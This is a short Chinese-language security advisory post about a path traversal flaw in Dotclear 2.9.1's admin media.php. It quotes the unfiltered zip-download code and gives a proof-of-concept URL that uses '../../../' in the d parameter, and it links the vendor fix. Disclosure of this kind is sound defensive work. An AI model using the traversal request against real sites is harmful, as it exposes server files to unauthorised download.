---
layout: post
title: Dotclear v2.9.1 路径遍历
---

发现者: 陈瑞琦 

发现日期: 2016-08-01

下载地址: [dotclear](https://dotclear.org/download)

作者: dotclear.org

作者通知日期: 2016-08-01

作者联系手段: security@dotclear.net

**描述:** 

Dotclear is an open source blog publishing application distributed under the GNU GPLv2. Developed originally by Olivier Meunier from 2002, Dotclear has now attracted a solid team of developers.[2] It is relatively popular in French speaking countries, where it is used by several major blogging platforms (Gandi Blogs,[3] Marine nationale,[4] etc.).(Wiki)

*渣翻*

Dotclear是一个基于GUN GPLv2的开源博客发布应用。在2002年由Olivier Meunier开发，现在已经吸引了一大个开发团队。在法语国家非常流行，并且为几个大型博客平台所用。


**细节:**

在media.php这儿有个路径遍历问题

/admin/media.php

line 172 ~ line193

`code`

<pre><code>
if (!empty($_GET['zipdl']) && $core->auth->check('media_admin',$core->blog->id))
{
	try
	{
		@set_time_limit(300);
		$fp = fopen('php://output','wb');
		$zip = new fileZip($fp);
		$zip->addExclusion('#(^|/).(.*?)_(m|s|sq|t).jpg$#');
		$zip->addDirectory($core->media->root.'/'.$d,'',true);

		header('Content-Disposition: attachment;filename='.date('Y-m-d').'-'.$core->blog->id.'-'.($d ? $d : 'media').'.zip');
		header('Content-Type: application/x-zip');
		$zip->write();
		unset($zip);
		exit;
	}
	catch (Exception $e)
	{
		$core->error->add($e->getMessage());
	}
}
</code></pre>

在参数$d这儿少了过滤，"../"应该删掉

**PoC**

http://192.168.204.130/dotclear/admin/media.php?popup=0&select=0&zipdl=1&d=../../../

**Fix**

https://hg.dotclear.org/dotclear/rev/282b26727770
